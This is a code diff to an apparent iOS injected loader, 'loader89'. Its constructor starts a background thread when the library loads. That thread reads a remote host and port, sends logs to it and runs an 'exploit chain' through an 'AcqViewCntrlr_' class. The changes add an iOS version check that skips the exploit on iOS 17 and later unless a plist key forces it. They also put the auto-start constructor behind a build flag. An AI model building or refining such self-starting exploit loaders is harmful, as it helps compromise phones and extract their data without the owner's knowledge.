@@ -117,6 +117,14 @@ static void sysctl_str(const char *name, char *out, unsigned long outn) {
     } else out[0] = 0;
 }
 
+static int ios_major_version(void) {
+    char buf[32];
+    sysctl_str("kern.osproductversion", buf, sizeof(buf));
+    int v = 0;
+    for (int i = 0; buf[i] >= '0' && buf[i] <= '9'; i++) v = v * 10 + (buf[i] - '0');
+    return v;
+}
+
 static char *objc_cstr(void *obj) {
     if (!obj) return 0;
     const char *s = (const char *)p_msgSend(obj, p_sel("UTF8String"));
@@ -574,7 +582,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v4.2 dual-chain start ===");
+    log_info("=== loader89 v4.4 safe-fallback start ===");
     read_runtime_config();
     char msg[600], bid[200];
     snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
@@ -599,9 +607,17 @@ static void *worker(void *arg) {
     post_log_now();
 
     int exploit_ok = 0;
+    int ios_major = ios_major_version();
+    int exploit_forced = info_int("Loader89EnableExploit", 0);
+    snprintf(msg, sizeof(msg), "iOS major=%d exploit_forced=%d", ios_major, exploit_forced);
+    log_info(msg);
     void *acqCls = p_getClass("AcqViewCntrlr_");
     log_info(acqCls ? "AcqViewCntrlr_ class OK" : "AcqViewCntrlr_ class MISSING");
-    if (acqCls) {
+    if (ios_major >= 17 && !exploit_forced) {
+        /* iOS 18/26 verified: core RunServer can throw an uncaught C++ exception
+         * and abort the whole process before MHA/MCM has a chance to upload. */
+        log_info("exploit chain SKIPPED (iOS>=17 crash guard)");
+    } else if (acqCls) {
         void *acq = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
         log_info(acq ? "AcqViewCntrlr_ instance OK" : "AcqViewCntrlr_ instance FAIL");
         if (acq) {
@@ -686,6 +702,7 @@ static void *worker(void *arg) {
 
 static void *g_thread_start;
 
+#ifndef LOADER89_APP_DISABLED
 __attribute__((constructor))
 static void loader89_init(void) {
     static void *th;
@@ -693,4 +710,5 @@ static void loader89_init(void) {
     g_thread_start = (void *)fn;
     if (pthread_create(&th, 0, worker, 0) == 0) pthread_detach(th);
 }
+#endif
 
